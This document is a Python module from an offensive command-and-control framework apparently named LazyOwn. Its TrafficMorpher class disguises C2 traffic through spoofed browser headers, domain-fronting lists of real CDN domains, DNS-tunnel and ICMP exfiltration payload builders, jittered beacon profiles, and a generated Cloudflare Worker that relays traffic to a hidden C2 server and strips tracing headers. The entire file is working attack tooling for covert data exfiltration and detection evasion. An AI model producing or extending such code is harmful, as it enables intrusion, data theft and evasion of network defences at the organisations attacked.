"""C2 traffic obfuscation: domain fronting, protocol mimicking, and traffic shaping.

Provides multiple strategies for disguising C2 traffic to blend in with
legitimate network traffic. Supports Cloudflare Workers proxy, domain
fronting against CDN providers, HTTPS certificate pinning, and traffic
morphing for popular protocols (HTTP/2, WebSocket, DNS, ICMP).
"""

from __future__ import annotations

import os
import random
import struct
import time
from typing import Any


class TrafficMorpher:
    """Transform C2 traffic patterns to mimic legitimate protocols."""

    HTTP2_FINGERPRINTS = [
        {
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "accept_language": "en-US,en;q=0.9",
            "accept_encoding": "gzip, deflate, br",
            "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        },
        {
            "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept_language": "en-US,en;q=0.9",
            "accept_encoding": "gzip, deflate, br",
        },
        {
            "user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "accept_language": "en-US,en;q=0.5",
            "accept_encoding": "gzip, deflate, br",
        },
    ]

    CDN_DOMAINS = {
        "cloudflare": [
            "cloudflare.com",
            "cdn.cloudflare.net",
            "cloudflare-dns.com",
            "cloudflare-ech.com",
        ],
        "azure": [
            "azureedge.net",
            "azurewebsites.net",
            "cloudapp.net",
            "trafficmanager.net",
            "azure-api.net",
        ],
        "aws": [
            "cloudfront.net",
            "amazonaws.com",
            "s3.amazonaws.com",
            "elasticbeanstalk.com",
        ],
        "google": [
            "googleapis.com",
            "cloudfunctions.net",
            "run.app",
            "firebaseio.com",
            "appspot.com",
        ],
        "fastly": [
            "fastly.net",
            "global.ssl.fastly.net",
            "fastlylb.net",
        ],
    }

    def __init__(self) -> None:
        self._active_fingerprint: dict[str, str] | None = None
        self._session_padding: list[int] = []

    def get_random_http_headers(self) -> dict[str, str]:
        """Return a randomized set of HTTP headers mimicking a real browser.

        Returns:
            Dictionary of HTTP headers.
        """
        fp = random.choice(self.HTTP2_FINGERPRINTS)
        self._active_fingerprint = fp
        return dict(fp)

    def get_cdn_fronting_hosts(
        self,
        provider: str = "cloudflare",
        count: int = 3,
    ) -> list[str]:
        """Return CDN domains suitable for domain fronting.

        Args:
            provider: CDN provider name (cloudflare, azure, aws, google, fastly).
            count: Number of domain suggestions to return.

        Returns:
            List of high-reputation CDN domain names.
        """
        domains = self.CDN_DOMAINS.get(provider.lower(), self.CDN_DOMAINS["cloudflare"])
        return random.sample(domains, min(count, len(domains)))

    def generate_traffic_padding(
        self,
        min_bytes: int = 64,
        max_bytes: int = 4096,
    ) -> bytes:
        """Generate random padding bytes to normalize packet sizes.

        Args:
            min_bytes: Minimum padding size.
            max_bytes: Maximum padding size.

        Returns:
            Random bytes for traffic padding.
        """
        size = random.randint(min_bytes, max_bytes)
        return os.urandom(size)

    def generate_jitter(self, base_delay: float, jitter_pct: float = 0.3) -> float:
        """Calculate a sleep delay with jitter.

        Args:
            base_delay: Base sleep time in seconds.
            jitter_pct: Percentage of jitter to apply (0.0 - 1.0).

        Returns:
            Adjusted sleep time with random jitter applied.
        """
        jitter = base_delay * jitter_pct * (random.random() * 2 - 1)
        return max(0.1, base_delay + jitter)

    def generate_dns_tunnel_payload(
        self,
        data: bytes,
        domain: str = "cdn.cloudflare.net",
    ) -> list[str]:
        """Encode data as DNS query subdomains for tunneling.

        Args:
            data: Raw data to tunnel.
            domain: Base domain for DNS queries.
            max_subdomain_len: Maximum subdomain label length.

        Returns:
            List of DNS query names.
        """
        import base64

        encoded = base64.b32hexencode(data).decode().rstrip("=").lower()
        queries = []
        label_len = random.randint(20, 50)
        for i in range(0, len(encoded), label_len):
            chunk = encoded[i:i + label_len]
            session_id = os.urandom(2).hex()
            queries.append(f"{session_id}.{chunk}.{domain}")
        return queries

    def generate_icmp_exfil_payload(self, data: bytes, chunk_size: int = 48) -> list[bytes]:
        """Generate ICMP echo payloads for data exfiltration.

        Args:
            data: Data to exfiltrate.
            chunk_size: Bytes per ICMP packet.

        Returns:
            List of ICMP payload byte sequences.
        """
        import hashlib

        chunks = []
        total_chunks = (len(data) + chunk_size - 1) // chunk_size
        checksum = hashlib.sha256(data).digest()[:8]

        for i in range(total_chunks):
            start = i * chunk_size
            end = min(start + chunk_size, len(data))
            chunk = data[start:end]
            header = struct.pack(">HH", i, total_chunks)
            stamp = struct.pack(">d", time.time())
            payload = header + checksum + stamp + chunk
            chunks.append(payload)
        return chunks

    def generate_websocket_masking(self, data: bytes) -> bytes:
        """Apply WebSocket frame masking with random key.

        Args:
            data: Raw data to mask as WebSocket frame.

        Returns:
            Masked WebSocket frame bytes.
        """
        mask_key = os.urandom(4)
        masked = bytearray(len(data))
        for i in range(len(data)):
            masked[i] = data[i] ^ mask_key[i % 4]
        return bytes(mask_key + masked)

    def generate_cloudflare_worker_proxy_config(
        self,
        c2_host: str,
        c2_port: int,
        auth_token: str | None = None,
    ) -> str:
        """Generate a Cloudflare Worker script that proxies C2 traffic.

        The worker acts as a reverse proxy, forwarding traffic from the
        CDN edge to the real C2 server while rewriting Host headers.

        Args:
            c2_host: Real C2 server hostname or IP.
            c2_port: Real C2 server port.
            auth_token: Optional pre-shared authentication token.

        Returns:
            Complete Cloudflare Worker JavaScript code.
        """
        token_check = ""
        if auth_token:
            token_check = f"""
    const token = new URL(request.url).searchParams.get('token');
    if (token !== '{auth_token}') {{
        return new Response('Not Found', {{ status: 404 }});
    }}
"""
        return f"""// LazyOwn C2 Cloudflare Worker Proxy
// Deploy via: wrangler deploy

export default {{
    async fetch(request, env, ctx) {{
        const url = new URL(request.url);
        const targetUrl = 'https://{c2_host}:{c2_port}' + url.pathname + url.search;
{token_check}
        const modifiedHeaders = new Headers(request.headers);
        modifiedHeaders.set('Host', '{c2_host}');
        modifiedHeaders.set('X-Forwarded-For', request.headers.get('cf-connecting-ip') || '');
        modifiedHeaders.set('X-Forwarded-Proto', 'https');
        modifiedHeaders.delete('cf-ipcountry');
        modifiedHeaders.delete('cf-ray');

        const proxyRequest = new Request(targetUrl, {{
            method: request.method,
            headers: modifiedHeaders,
            body: request.body,
            redirect: 'follow',
        }});

        try {{
            const response = await fetch(proxyRequest);
            const responseHeaders = new Headers(response.headers);
            responseHeaders.set('cf-cache-status', 'DYNAMIC');
            return new Response(response.body, {{
                status: response.status,
                statusText: response.statusText,
                headers: responseHeaders,
            }});
        }} catch (e) {{
            return new Response('Service Unavailable', {{ status: 503 }});
        }}
    }},
}};
"""

    def generate_beacon_profile(
        self,
        name: str = "default",
        protocol: str = "https",
        jitter_pct: float = 0.2,
        user_agent: str | None = None,
    ) -> dict[str, Any]:
        """Generate a complete C2 beacon profile configuration.

        Args:
            name: Profile name.
            protocol: Beacon protocol (https, dns, icmp, websocket).
            jitter_pct: Jitter percentage for beacon timing.
            user_agent: Custom user agent string.

        Returns:
            Beacon profile dictionary.
        """
        ua = user_agent or random.choice(self.HTTP2_FINGERPRINTS)["user_agent"]
        profile = {
            "name": name,
            "protocol": protocol,
            "jitter": jitter_pct,
            "sleep_time": random.randint(3, 15),
            "max_retries": 3,
            "headers": self.get_random_http_headers() if protocol in ("https", "websocket") else {},
            "user_agent": ua,
            "malleable_route": random.choice([
                "/api/v1/status",
                "/metrics/health",
                "/cdn/analytics",
                "/static/fonts/woff2",
                "/js/chunk-vendors.js",
                "/assets/images/bg.jpg",
            ]),
            "host_headers": random.choice([
                "www.googleapis.com",
                "ajax.googleapis.com",
                "cdn.jsdelivr.net",
            ]),
            "padding": {
                "min": 64,
                "max": 1024,
                "enabled": True,
            },
            "dns": {
                "subdomain_prefix": os.urandom(2).hex(),
                "max_label_len": 50,
                "domain": random.choice(self.CDN_DOMAINS["cloudflare"]),
            } if protocol == "dns" else None,
        }
        return {k: v for k, v in profile.items() if v is not None}


__all__ = ["TrafficMorpher"]
